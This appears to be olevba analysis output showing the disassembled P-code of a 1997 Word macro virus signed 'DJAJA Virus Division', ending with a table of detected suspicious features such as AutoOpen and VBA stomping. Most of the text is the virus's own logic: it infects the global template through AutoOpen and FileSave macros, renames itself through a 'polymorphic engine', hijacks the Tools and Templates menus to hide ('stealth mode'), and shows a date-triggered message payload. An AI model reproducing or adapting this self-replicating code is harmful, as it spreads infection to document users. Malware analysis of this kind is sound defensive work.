' Line #16:
' 	Dim 
' 	VarDefn B6
' Line #17:
' 	Dim 
' 	VarDefn B7
' Line #18:
' 	Dim 
' 	VarDefn B8
' Line #19:
' 	Dim 
' 	VarDefn B9
' Line #20:
' 	Dim 
' 	VarDefn B0
' Line #21:
' 	Dim 
' 	VarDefn Y
' Line #22:
' 	Dim 
' 	VarDefn T
' Line #23:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #24:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError ErrOpen 
' Line #25:
' 	Dim 
' 	VarDefn Allready
' Line #26:
' 	Let 
' 	LitDI2 0x0000 
' 	St Allready 
' Line #27:
' Line #28:
' Line #29:
' 	QuoteRem 0x0004 0x0024 "** Check macros ID in GlobalTemplate"
' Line #30:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #31:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	FnLen 
' 	LitDI2 0x0014 
' 	Eq 
' 	IfBlock 
' Line #32:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0014 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St False$ 
' Line #33:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St G$ 
' Line #34:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0013 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St H$ 
' Line #35:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St I_$ 
' Line #36:
' 	Ld False$ 
' 	Ld G$ 
' 	Eq 
' 	Paren 
' 	Ld H$ 
' 	Ld I_$ 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #37:
' 	Let 
' 	LitDI2 0x0001 
' 	UMi 
' 	St Allready 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' Line #42:
' Line #43:
' 	Ld Allready 
' 	Not 
' 	IfBlock 
' Line #44:
' 	QuoteRem 0x0006 0x0027 "** Dilakukan bila global belum tertular"
' Line #45:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #46:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #47:
' Line #48:
' 	QuoteRem 0x0006 0x0015 "** Polymorphic engine"
' Line #49:
' 	OptionBase 
' 	LitDI2 0x000B 
' 	Redim AI__$ 0x0001 (As String)
' Line #50:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #51:
' 	Ld J 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	FnLen 
' 	LitDI2 0x0014 
' 	Eq 
' 	IfBlock 
' Line #52:
' 	Ld J 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0014 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St False$ 
' Line #53:
' 	Ld J 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St G$ 
' Line #54:
' 	Ld J 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0013 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St H$ 
' Line #55:
' 	Ld J 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St I_$ 
' Line #56:
' 	Ld False$ 
' 	Ld G$ 
' 	Eq 
' 	Paren 
' 	Ld H$ 
' 	Ld I_$ 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #57:
' 	Ld J 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St Rnd_$ 
' Line #58:
' 	QuoteRem 0x000E 0x0018 "MsgBox(MacroName$(J, 1))"
' Line #59:
' 	StartForVariable 
' 	Ld K 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #60:
' 	LitDI2 0x0001 
' 	Ld num 
' 	ArgsLd String$ 0x0002 
' 	Ld K 
' 	ArgsSt AI__$ 0x0001 
' Line #61:
' 	StartForVariable 
' 	Ld K 
' 	EndForVariable 
' 	NextVar 
' Line #62:
' 	LitDI2 0x0001 
' 	ArgsLd AI__$ 0x0001 
' 	St B1$ 
' 	BoS 0x0000 
' 	LitDI2 0x0002 
' 	ArgsLd AI__$ 0x0001 
' 	St B2$ 
' Line #63:
' 	LitDI2 0x0003 
' 	ArgsLd AI__$ 0x0001 
' 	St B3$ 
' 	BoS 0x0000 
' 	LitDI2 0x0004 
' 	ArgsLd AI__$ 0x0001 
' 	St B4$ 
' Line #64:
' 	LitDI2 0x0005 
' 	ArgsLd AI__$ 0x0001 
' 	St B5$ 
' 	BoS 0x0000 
' 	LitDI2 0x0006 
' 	ArgsLd AI__$ 0x0001 
' 	St B6$ 
' Line #65:
' 	LitDI2 0x0007 
' 	ArgsLd AI__$ 0x0001 
' 	St B7$ 
' 	BoS 0x0000 
' 	LitDI2 0x0008 
' 	ArgsLd AI__$ 0x0001 
' 	St B8$ 
' Line #66:
' 	LitDI2 0x0009 
' 	ArgsLd AI__$ 0x0001 
' 	St B9$ 
' 	BoS 0x0000 
' 	LitDI2 0x000A 
' 	ArgsLd AI__$ 0x0001 
' 	St B0$ 
' Line #67:
' 	LitStr 0x0000 ""
' 	St Y$ 
' Line #68:
' 	StartForVariable 
' 	Ld T 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #69:
' 	Ld T 
' 	ArgsLd AI__$ 0x0001 
' 	Ld Y$ 
' 	Add 
' 	St Y$ 
' Line #70:
' 	StartForVariable 
' 	Ld T 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd_$ 
' 	Add 
' 	LitStr 0x0007 "Global:"
' 	Ld Y$ 
' 	Add 
' 	Ld B1$ 
' 	Add 
' 	Ld B2$ 
' 	Add 
' 	Ld B3$ 
' 	Add 
' 	Ld B4$ 
' 	Add 
' 	Ld B5$ 
' 	Add 
' 	Ld B6$ 
' 	Add 
' 	Ld B7$ 
' 	Add 
' 	Ld B8$ 
' 	Add 
' 	Ld B9$ 
' 	Add 
' 	Ld B0$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #72:
' Line #73:
' 	QuoteRem 0x000E 0x000E "* Stealth mode"
' Line #74:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd_$ 
' 	Add 
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #75:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd_$ 
' 	Add 
' 	LitStr 0x0013 "Global:ViewToolBars"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #76:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd_$ 
' 	Add 
' 	LitStr 0x0014 "Global:FileTemplates"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #77:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd_$ 
' 	Add 
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #78:
' 	Ld WordBasic 
' 	ArgsMemCall SaveTemplate 0x0000 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #82:
' Line #83:
' 	ElseBlock 
' Line #84:
' 	QuoteRem 0x0006 0x0027 "** Dilakukan bila global telah tertular"
' Line #85:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #86:
' 	Ld J 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	FnLen 
' 	LitDI2 0x0014 
' 	Eq 
' 	IfBlock 
' Line #87:
' 	Ld J 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0014 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St False$ 
' Line #88:
' 	Ld J 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St G$ 
' Line #89:
' 	Ld J 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0013 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St H$ 
' Line #90:
' 	Ld J 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St I_$ 
' Line #91:
' 	Ld False$ 
' 	Ld G$ 
' 	Eq 
' 	Paren 
' 	Ld H$ 
' 	Ld I_$ 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #92:
' 	QuoteRem 0x000D 0x0024 "MsgBox("Ialah  " + MacroName$(J, 0))"
' Line #93:
' 	Ld J 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	St Rnd_$ 
' Line #94:
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #95:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #96:
' 	LitStr 0x0007 "Global:"
' 	Ld Rnd_$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld Rnd_$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #97:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #101:
' Line #102:
' 	EndIfBlock 
' Line #103:
' Line #104:
' 	Label ErrOpen 
' Line #105:
' 	ArgsCall DVD 0x0000 
' Line #106:
' Line #107:
' 	EndSub 
' Line #108:
' Line #109:
' 	FuncDefn (Private Sub DVD())
' Line #110:
' 	Dim 
' 	VarDefn Date_
' Line #111:
' 	Dim 
' 	VarDefn Sc
' Line #112:
' 	Dim 
' 	VarDefn dlg (As Object)
' Line #113:
' 	Dim 
' 	VarDefn Button
' Line #114:
' 	Dim 
' 	VarDefn Key
' Line #115:
' 	Dim 
' 	VarDefn Me_
' Line #116:
' 	Dim 
' 	VarDefn Text1
' 	VarDefn Text2
' 	VarDefn Typer
' 	VarDefn PassInputKey
' Line #117:
' 	Dim 
' 	VarDefn Key1
' 	VarDefn Key2
' Line #118:
' Line #119:
' 	Let 
' 	LitStr 0x0039 "DVD v1.0. Copyright-1997, DVD Software. Ft-Mesin UNTAR'95"
' 	St Text1$ 
' Line #120:
' 	Let 
' 	LitStr 0x0014 "DJAJA Virus Division"
' 	St Text2$ 
' Line #121:
' 	Let 
' 	LitStr 0x0014 "DJAJA HD-LWP is Good"
' 	St Key1$ 
' Line #122:
' 	Let 
' 	LitStr 0x000D "I LOVE HD-LWP"
' 	St Key2$ 
' Line #123:
' Line #124:
' Line #125:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	St Date_ 
' Line #126:
' 	Ld Date_ 
' 	LitDI2 0x000A 
' 	Eq 
' 	Ld Date_ 
' 	LitDI2 0x0012 
' 	Eq 
' 	Or 
' 	Ld Date_ 
' 	LitDI2 0x001B 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #127:
' Line #128:
' 	Let 
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Second 0x0001 
' 	St Sc 
' Line #129:
' 	Ld Sc 
' 	LitDI2 0x001F 
' 	Lt 
' 	IfBlock 
' Line #130:
' 	Let 
' 	Ld Key1$ 
' 	St Typer$ 
' Line #131:
' 	Let 
' 	Ld Key1$ 
' 	St PassInputKey$ 
' Line #132:
' 	ElseBlock 
' Line #133:
' 	Let 
' 	Ld Key2$ 
' 	St Typer$ 
' Line #134:
' 	Let 
' 	Ld Key2$ 
' 	St PassInputKey$ 
' Line #135:
' 	EndIfBlock 
' Line #136:
' Line #137:
' 	LitDI2 0x0140 
' 	LitDI2 0x005C 
' 	LitStr 0x0013 "Welcome to My World"
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0003 
' Line #138:
' 	LitDI2 0x000A 
' 	LitDI2 0x0006 
' 	LitDI2 0x012F 
' 	LitDI2 0x004D 
' 	LitStr 0x0000 ""
' 	Ld WordBasic 
' 	ArgsMemCall GroupBox 0x0005 
' Line #139:
' 	LitDI2 0x00A8 
' 	LitDI2 0x003A 
' 	LitDI2 0x0079 
' 	LitDI2 0x000D 
' 	LitStr 0x000E "Created by F?D"
' 	LitStr 0x0005 "Text5"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #140:
' 	LitDI2 0x00A8 
' 	LitDI2 0x0016 
' 	LitDI2 0x007D 
' 	LitDI2 0x000D 
' 	LitStr 0x000F "DVD version 1.0"
' 	LitStr 0x0005 "Text1"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #141:
' 	LitDI2 0x0017 
' 	LitDI2 0x0018 
' 	LitDI2 0x007F 
' 	LitDI2 0x0015 
' 	Ld WordBasic 
' 	ArgsMemCall OKButton 0x0004 
' Line #142:
' 	LitDI2 0x0017 
' 	LitDI2 0x0032 
' 	LitDI2 0x007F 
' 	LitDI2 0x0015 
' 	LitStr 0x0009 "About DVD"
' 	LitStr 0x0005 "Push1"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #143:
' 	LitDI2 0x00A8 
' 	LitDI2 0x0029 
' 	LitDI2 0x007D 
' 	LitDI2 0x000D 
' 	LitStr 0x0010 "(C)opyright 1997"
' 	LitStr 0x0005 "Text2"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #144:
' 	LitDI2 0x00A8 
' 	LitDI2 0x003C 
' 	LitDI2 0x000D 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x0005 "Text3"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #145:
' 	Ld Text1$ 
' 	Paren 
' 	ArgsCall Runner 0x0001 
' Line #146:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #147:
' Line #148:
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set dlg 
' Line #149:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd UserDialog 0x0001 
' 	St Button 
' Line #150:
' Line #151:
' 	Ld dlg 
' 	MemLd Push1 
' 	IfBlock 
' Line #152:
' 	LitDI2 0x0140 
' 	LitDI2 0x0050 
' 	LitStr 0x0009 "About DVD"
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0003 
' Line #153:
' 	LitDI2 0x000B 
' 	LitDI2 0x001A 
' 	LitDI2 0x012E 
' 	LitDI2 0x0012 
' 	LitStr 0x0008 "TextBox1"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #154:
' 	LitDI2 0x000B 
' 	LitDI2 0x0009 
' 	LitDI2 0x00EB 
' 	LitDI2 0x000D 
' 	LitStr 0x0005 "Type "
' 	Ld Typer$ 
' 	Add 
' 	LitStr 0x0005 "Text1"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #155:
' 	LitDI2 0x0071 
' 	LitDI2 0x0034 
' 	LitDI2 0x0058 
' 	LitDI2 0x0015 
' 	Ld WordBasic 
' 	ArgsMemCall OKButton 0x0004 
' Line #156:
' 	Ld Text2$ 
' 	Paren 
' 	ArgsCall Runner 0x0001 
' Line #157:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #158:
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set dlg 
' Line #159:
' Line #160:
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set dlg 
' Line #161:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd UserDialog 0x0001 
' 	St Button 
' Line #162:
' 	Ld dlg 
' 	MemLd TextBox1 
' 	St Key$ 
' Line #163:
' 	Ld Key$ 
' 	Ld PassInputKey$ 
' 	Eq 
' 	IfBlock 
' Line #164:
' 	LitDI2 0x023E 
' 	LitDI2 0x0090 
' 	LitStr 0x0009 "About DVD"
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0003 
' Line #165:
' 	LitDI2 0x00C4 
' 	LitDI2 0x006E 
' 	LitDI2 0x00C1 
' 	LitDI2 0x0015 
' 	LitStr 0x0003 "DVD"
' 	LitStr 0x0005 "Push1"
' 	Ld WordBasic 
' 	ArgsMemCall PushButton 0x0006 
' Line #166:
' 	LitDI2 0x0013 
' 	LitDI2 0x000B 
' 	LitDI2 0x0169 
' 	LitDI2 0x000D 
' 	LitStr 0x002E "Terima kasih telah mengetikkan dengan  benar. "
' 	LitStr 0x0005 "Text1"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #167:
' 	LitDI2 0x0013 
' 	LitDI2 0x001D 
' 	LitDI2 0x0201 
' 	LitDI2 0x000D 
' 	LitStr 0x003E "Saya dedikasikan kreasi saya ini untuk HD- LWP. Semoga HD-LWP "
' 	LitStr 0x0005 "Text2"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #168:
' 	LitDI2 0x0013 
' 	LitDI2 0x0030 
' 	LitDI2 0x021D 
' 	LitDI2 0x000D 
' 	LitStr 0x0045 "selalu dilindungi oleh-Nya.  Jangan takut DVD tidak akan merusak data"
' 	LitStr 0x0005 "Text3"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #169:
' 	LitDI2 0x0013 
' 	LitDI2 0x0043 
' 	LitDI2 0x0215 
' 	LitDI2 0x000D 
' 	LitStr 0x0040 "Anda, apalagi sampai menghapusnya. DVD hanya akan mejeng setiap "
' 	LitStr 0x0005 "Text5"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #170:
' 	LitDI2 0x0013 
' 	LitDI2 0x0056 
' 	LitDI2 0x0160 
' 	LitDI2 0x000D 
' 	LitStr 0x002E "tanggal-tanggal tertentu saja.  Created by F?D"
' 	LitStr 0x0005 "Text6"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #171:
' 	LitDI2 0x0013 
' 	LitDI2 0x0043 
' 	LitDI2 0x0160 
' 	LitDI2 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x0005 "Text4"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0006 
' Line #172:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #173:
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set dlg 
' Line #174:
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set dlg 
' Line #175:
' 	Let 
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd UserDialog 0x0001 
' 	St Me_ 
' Line #176:
' 	EndIfBlock 
' Line #177:
' Line #178:
' Line #179:
' 	EndIfBlock 
' Line #180:
' 	EndIfBlock 
' Line #181:
' 	EndSub 
' Line #182:
' Line #183:
' 	FuncDefn (Private Sub Runner(Texto))
' Line #184:
' 	Dim 
' 	VarDefn I
' Line #185:
' 	Dim 
' 	VarDefn J
' Line #186:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Texto$ 
' 	FnLen 
' 	Paren 
' 	For 
' Line #187:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0064 
' 	For 
' Line #188:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #189:
' 	Ld Texto$ 
' 	Ld I 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #190:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #191:
' 	EndSub 
' Line #192:
' Line #193:
' 	FuncDefn (Private Function num())
' Line #194:
' 	Dim 
' 	VarDefn a
' Line #195:
' 	Dim 
' 	VarDefn B
' Line #196:
' 	LitDI2 0x0041 
' 	St a 
' Line #197:
' 	LitDI2 0x005A 
' 	St B 
' Line #198:
' 	ArgsLd Rnd 0x0000 
' 	Ld B 
' 	Ld a 
' 	Sub 
' 	Paren 
' 	Mul 
' 	Ld a 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St num 
' Line #199:
' 	EndFunc 
' Macros/VBA/RUTATHHONRRNOHHTATUR - 891 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableInput 0x0001 
' Line #3:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

